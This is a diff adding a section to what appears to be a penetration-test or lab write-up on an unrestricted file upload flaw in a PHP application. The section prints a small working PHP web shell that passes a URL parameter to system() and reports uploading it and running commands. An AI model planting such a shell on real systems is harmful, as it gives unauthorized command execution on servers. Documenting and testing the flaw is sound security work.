@@ -53,3 +53,29 @@ Various testing methods can be used to detect the vulnerability:
 *** file size validation
 - Attempt to upload very large files.
 - Check how the server enforces file size limits and if it accepts large files.
+
+* identifying the vulnerability
+To confirm and exploit the vulnerability, attempts will be made to upload malicious files such as web shells with a php extension that could lead to unauthorized operations on the system.
+
+[[./imgs/application.png]]
+
+Since the target system is written in PHP, a web shell file named cmd.php has been prepared using PHP. The source code is provided below:
+
+#+begin_src php cmd.php
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+#+end_src
+
+[[./imgs/uploaded.png]]
+
+It is observed that the shell file has been successfully uploaded to the system without any filtering, indicating the presence of the Unrestricted File Upload vulnerability.
+
+The path of the uploaded file is provided on the screen, allowing shell commands to be executed on the operating system with the given permissions.,
+
+[[./imgs/whoa.png]]
+
+
+[[./imgs/pwd.png]]
